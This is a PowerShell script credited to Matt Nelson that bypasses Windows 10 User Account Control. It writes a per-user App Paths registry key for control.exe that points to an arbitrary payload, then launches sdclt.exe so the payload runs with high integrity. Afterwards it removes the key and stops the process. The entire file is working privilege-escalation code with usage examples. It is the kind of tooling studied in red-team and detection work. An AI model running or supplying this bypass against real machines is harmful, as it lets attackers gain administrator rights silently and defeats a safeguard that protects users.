function Invoke-AppPathBypass {
<#
.SYNOPSIS

Bypasses UAC by abusing the App Path key for control.exe
Only tested on Windows 10

Author: Matt Nelson (@enigma0x3)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None

.PARAMETER Payload

 Specifies the full path to the binary you want to run in a high-integrity context.

.EXAMPLE

Invoke-AppPathBypass -Payload 'C:\Windows\System32\cmd.exe'

This will start cmd.exe in a high-integrity context.

#>

    [CmdletBinding(SupportsShouldProcess = $True, ConfirmImpact = 'Medium')]
    Param (

        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Payload,

        [Switch]
        $Force
    )
    $ConsentPrompt = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).ConsentPromptBehaviorAdmin
    $SecureDesktopPrompt = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).PromptOnSecureDesktop

    if($ConsentPrompt -Eq 2 -And $SecureDesktopPrompt -Eq 1){
        "UAC is set to 'Always Notify'. This module does not bypass this setting."
        exit
    }
    else{
        #Begin Execution
        $AppPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe"
        if ($Force -or ((Get-ItemProperty -Path $AppPath -ErrorAction SilentlyContinue) -eq $null)){
            New-Item $AppPath -Force |
                New-ItemProperty -Name '(default)' -Value $Payload -PropertyType string -Force | Out-Null
        }else{
            Write-Warning "Key already exists, consider using -Force"
            exit
        }

        if (Test-Path $AppPath) {
            Write-Verbose "Created registry entries for control.exe App Path"
        }else{
            Write-Warning "Failed to create registry key, exiting"
            exit
        }

        $sdcltPath = Join-Path -Path ([Environment]::GetFolderPath('System')) -ChildPath 'sdclt.exe'
        if ($PSCmdlet.ShouldProcess($sdcltPath, 'Start process')) {
            $Process = Start-Process -FilePath $sdcltPath  -PassThru
            Write-Verbose "Started sdclt.exe"
        }

        #Sleep 5 seconds 
        Write-Verbose "Sleeping 5 seconds to trigger payload"
        if (-not $PSBoundParameters['WhatIf']) {
            Start-Sleep -Seconds 5
        }

        if (Test-Path $AppPath) {
            #Remove the registry entry
            Remove-Item $AppPath -Recurse -Force
            Write-Verbose "Removed registry entries"
        }

        if(Get-Process -Id $Process.Id -ErrorAction SilentlyContinue){
            Stop-Process -Id $Process.Id
            Write-Verbose "Killed running sdclt process"
        }
    }
}
